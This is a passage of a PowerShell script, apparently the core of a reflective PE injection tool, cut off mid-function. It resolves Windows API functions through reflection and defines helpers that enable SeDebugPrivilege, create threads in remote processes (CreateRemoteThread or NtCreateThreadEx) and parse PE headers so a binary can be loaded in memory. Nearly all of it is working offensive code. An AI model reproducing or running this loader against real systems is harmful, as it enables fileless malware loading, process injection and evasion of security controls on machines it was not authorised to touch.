		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

		return $Win32Constants
	}

	Function Get-Win32Functions
	{
		$Win32Functions = New-Object System.Object

		$VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
		$VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

		$VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
		$VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

		$memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
		$memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy

		$memsetAddr = Get-ProcAddress msvcrt.dll memset
		$memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset

		$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
		$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
		$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

		$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
		$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

		$GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress
		$GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
		$GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr

		$VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
		$VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

		$VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
		$VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

		$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
		$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
		$Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

		$GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
		$GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
		$GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
		$Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

		$FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
		$FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
		$FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

		$OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
	    $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

		$WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
	    $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
	    $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject

		$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory

		$ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory

		$CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread

		$GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread

		$OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken

		$GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread

		$AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges

		$LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue

		$ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf


        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
		    $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }

		$IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process

		$CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
		$Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread

		return $Win32Functions
	}









	Function Sub-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{
				$Val = $Value1Bytes[$i] - $CarryOver

				if ($Val -lt $Value2Bytes[$i])
				{
					$Val += 256
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}


				[UInt16]$Sum = $Val - $Value2Bytes[$i]

				$FinalBytes[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}

		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


	Function Add-SignedIntAsUnsigned
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
		[Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			$CarryOver = 0
			for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
			{

				[UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

				$FinalBytes[$i] = $Sum -band 0x00FF

				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$CarryOver = 1
				}
				else
				{
					$CarryOver = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}

		return [BitConverter]::ToInt64($FinalBytes, 0)
	}


	Function Compare-Val1GreaterThanVal2AsUInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$Value1,

		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$Value2
		)

		[Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
		[Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

		if ($Value1Bytes.Count -eq $Value2Bytes.Count)
		{
			for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
			{
				if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
				{
					return $true
				}
				elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}

		return $false
	}


	Function Convert-UIntToInt
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)

		[Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($ValueBytes, 0))
	}


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value

        return $Hex
    }


	Function Test-MemoryRangeValid
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$DebugString,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,

		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,

		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)

	    [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))

		$PEEndAddress = $PEInfo.EndAddress

		if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $DebugString"
		}
		if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $DebugString"
		}
	}


	Function Write-BytesToMemory
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,

			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$MemoryAddress
		)

		for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
		}
	}



	Function Get-DelegateType
	{
	    Param
	    (
	        [OutputType([Type])]

	        [Parameter( Position = 0)]
	        [Type[]]
	        $Parameters = (New-Object Type[](0)),

	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )

	    $Domain = [AppDomain]::CurrentDomain
	    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
	    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
	    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
	    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
	    $MethodBuilder.SetImplementationFlags('Runtime, Managed')

	    Write-Output $TypeBuilder.CreateType()
	}



	Function Get-ProcAddress
	{
	    Param
	    (
	        [OutputType([IntPtr])]

	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,

	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $Procedure
	    )


	    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals('System.dll') }
	    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

	    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')

		Try
		{
			$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')
		}
		Catch
		{
			$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress',
                                                            [reflection.bindingflags] "Public,Static",
                                                            $null,
                                                            [System.Reflection.CallingConventions]::Any,
                                                            @((New-Object System.Runtime.InteropServices.HandleRef).GetType(),
                                                            [string]),
                                                            $null)
		}


	    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
	    $tmpPtr = New-Object IntPtr
	    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)


	    Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
	}


	Function Enable-SeDebugPrivilege
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
		if ($ThreadHandle -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}

		[IntPtr]$ThreadToken = [IntPtr]::Zero
		[Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
		if ($Result -eq $false)
		{
			$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($ErrorCode -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$Result = $Win32Functions.ImpersonateSelf.Invoke(3)
				if ($Result -eq $false)
				{
					Throw "Unable to impersonate self"
				}

				$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
				if ($Result -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
			}
		}

		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.LUID))
		$Result = $Win32Functions.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($Result -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}

		[UInt32]$TokenPrivSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.TOKEN_PRIVILEGES)
		[IntPtr]$TokenPrivilegesMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TokenPrivSize)
		$TokenPrivileges = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TokenPrivilegesMem, [Type]$Win32Types.TOKEN_PRIVILEGES)
		$TokenPrivileges.PrivilegeCount = 1
		$TokenPrivileges.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$Win32Types.LUID)
		$TokenPrivileges.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($TokenPrivileges, $TokenPrivilegesMem, $true)

		$Result = $Win32Functions.AdjustTokenPrivileges.Invoke($ThreadToken, $false, $TokenPrivilegesMem, $TokenPrivSize, [IntPtr]::Zero, [IntPtr]::Zero)
		$ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
		if (($Result -eq $false) -or ($ErrorCode -ne 0))
		{

		}

		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TokenPrivilegesMem)
	}


	Function Create-RemoteThread
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$ProcessHandle,

		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,

		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$ArgumentPtr = [IntPtr]::Zero,

		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$Win32Functions
		)

		[IntPtr]$RemoteThreadHandle = [IntPtr]::Zero

		$OSVersion = [Environment]::OSVersion.Version

		if (($OSVersion -ge (New-Object 'Version' 6,0)) -and ($OSVersion -lt (New-Object 'Version' 6,2)))
		{

			$RetVal= $Win32Functions.NtCreateThreadEx.Invoke([Ref]$RemoteThreadHandle, 0x1FFFFF, [IntPtr]::Zero, $ProcessHandle, $StartAddress, $ArgumentPtr, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($RemoteThreadHandle -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
			}
		}

		else
		{

			$RemoteThreadHandle = $Win32Functions.CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $ArgumentPtr, 0, [IntPtr]::Zero)
		}

		if ($RemoteThreadHandle -eq [IntPtr]::Zero)
		{
			Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
		}

		return $RemoteThreadHandle
	}



	Function Get-ImageNtHeaders
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		$NtHeadersInfo = New-Object System.Object


		$dosHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PEHandle, [Type]$Win32Types.IMAGE_DOS_HEADER)


		[IntPtr]$NtHeadersPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEHandle) ([Int64][UInt64]$dosHeader.e_lfanew))
		$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $NtHeadersPtr
		$imageNtHeaders64 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS64)


	    if ($imageNtHeaders64.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }

		if ($imageNtHeaders64.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders64
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$ImageNtHeaders32 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($NtHeadersPtr, [Type]$Win32Types.IMAGE_NT_HEADERS32)
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $imageNtHeaders32
			$NtHeadersInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}

		return $NtHeadersInfo
	}



	Function Get-PEBasicInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)

		$PEInfo = New-Object System.Object


		[IntPtr]$UnmanagedPEBytes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PEBytes.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $UnmanagedPEBytes, $PEBytes.Length) | Out-Null


		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $UnmanagedPEBytes -Win32Types $Win32Types


		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)


		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($UnmanagedPEBytes)

		return $PEInfo
	}




	Function Get-PEDetailedInfo
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,

		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Types,

		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		if ($PEHandle -eq $null -or $PEHandle -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}

		$PEInfo = New-Object System.Object


		$NtHeadersInfo = Get-ImageNtHeaders -PEHandle $PEHandle -Win32Types $Win32Types


		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $PEHandle
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($NtHeadersInfo.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($NtHeadersInfo.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($NtHeadersInfo.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($NtHeadersInfo.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_NT_HEADERS64)))
